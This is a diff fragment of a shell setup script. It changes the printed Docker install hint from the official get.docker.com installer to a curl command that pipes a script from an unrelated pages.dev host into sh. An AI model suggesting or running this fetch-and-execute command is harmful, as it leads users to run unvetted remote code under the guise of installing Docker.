@@ -29,7 +29,7 @@ if ! command -v docker &> /dev/null; then
     echo -e "${RED}❌ Docker not found${NC}"
     echo ""
     echo "Please install Docker first:"
-    echo "  curl -fsSL https://get.docker.com | sh"
+    echo "  curl -fsSL https://distributex-cloud-network.pages.dev/ | sh"
     exit 1
 fi
 
